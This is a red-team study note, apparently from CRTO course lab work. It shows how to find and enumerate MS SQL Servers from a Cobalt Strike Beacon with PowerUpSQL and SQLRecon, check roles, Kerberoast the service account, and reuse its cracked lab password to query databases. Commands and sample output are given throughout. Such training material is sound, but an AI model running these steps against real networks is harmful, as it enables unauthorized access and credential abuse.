
#### 🖊️ Using PowerUpSQL

######  Find MS SQL Servers

You can use cmdlets like:

`Get-SQLInstanceDomain`
`Get-SQLInstanceBroadcast`
`Get-SQLInstanceScanUDP`
```
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
beacon> powershell Get-SQLInstanceDomain
```

Also search for domain groups named like "SQL Admins" for example

######  Get info about the MS SQL Server

 Use `Get-SQLServerInfo` to gather more information about the instance.

`beacon> powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"`

######  Test connecting to it

`Get-SQLConnectionTest` can be used to test whether or not we can connect to the database.

`beacon> powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl`

⚠ Automate the collection with this:
`beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo`


Test access issuing queries against a SQL instance.  `Get-SQLQuery` from PowerUpSQL:

`beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"`

❗ For this you may want to first get access to be able to run it, check SQL Recon section

#### 📔 Using SQL Recon

SQL Recon enumerates servers via SPNs and fetch information about the instance with the `info` module.

######  Find MS SQL Servers

`beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns`

######  Get info about the MS SQL Server

`beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info`
```
[*] Extracting SQL Server information from sql-2.dev.cyberbotic.io

 |-> ComputerName:           SQL-2
 |-> DomainName:             DEV
 |-> ServicePid:             4388
 |-> ServiceName:            MSSQLSERVER
 |-> ServiceAccount:         DEV\mssql_svc
 |-> AuthenticationMode:     Windows Authentication
 |-> ForcedEncryption:       0
 |-> Clustered:              No
 |-> SqlServerVersionNumber: 15.0.2000.5
 |-> SqlServerMajorVersion:  2019
 |-> SqlServerEdition:       Standard Edition (64-bit)
 |-> SqlServerServicePack:   RTM
 |-> OsArchitecture:         X64
 |-> OsVersionNumber:        2022
 |-> CurrentLogin:           DEV\bfarmer
 |-> IsSysAdmin:             No
 |-> ActiveSessions:         1
```

In this example, the `/auth:wintoken` option allows SQLRecon to use the access token of the Beacon.  This output shows that whilst the database is accessible, our current user, bfarmer, is not a sysadmin.  

Also we can see that `DEV\mssql_svc` is running the service. 

######  Find Your Roles and Members

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

[*] Determining user permissions on sql-2.dev.cyberbotic.io,1433
[*] Logged in as DEV\bfarmer
[*] Mapped to the user guest
[*] Roles:
 |-> User is a member of public role.
 |-> User is NOT a member of db_owner role.
 |-> User is NOT a member of db_accessadmin role.
 |-> User is NOT a member of db_securityadmin role.
 |-> User is NOT a member of db_ddladmin role.
 |-> User is NOT a member of db_backupoperator role.
 |-> User is NOT a member of db_datareader role.
 |-> User is NOT a member of db_datawriter role.
 |-> User is NOT a member of db_denydatareader role.
 |-> User is NOT a member of db_denydatawriter role.
 |-> User is NOT a member of sysadmin role.
 |-> User is NOT a member of setupadmin role.
 |-> User is NOT a member of serveradmin role.
 |-> User is NOT a member of securityadmin role.
 |-> User is NOT a member of processadmin role.
 |-> User is NOT a member of diskadmin role.
 |-> User is NOT a member of dbcreator role.
 |-> User is NOT a member of bulkadmin role.
```

Look for other people that might have better access:

`beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }`

Also try attacking the account that is running the service (mssql_svc in this example), via something like [[Kerberoasting]] , this way you will obtain the plaintext password. 

######  Use your findings

 The credentials can be used with `make_token` in Beacon and `/a:WinToken` in SQLRecon; or the `/a:WinDomain` option with `/d:<domain> /u:<username> /p:<password>` in SQLRecon directly.

Checking permissions with the pwned account:
`beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /h:sql-2.dev.cyberbotic.io,1433 /m:whoami`

❗ Once you have access permission, you can start querying the DB (either with powerupsql or sqlrecon), for example:

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"select @@servername"

[*] Executing 'select @@servername' on sql-2.dev.cyberbotic.io,1433
column0 | 
----------
SQL-2 |
```

Or mssqlclient.py from impacket:

`ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25`

Or even [HeidiSQL](https://www.heidisql.com/) via Proxifier with a GUI access.



#### ⚠ Opsec




### Properties
---
📆 created   {{21-02-2024}} 12:45
🏷️ tags: #redteam #crto 

---

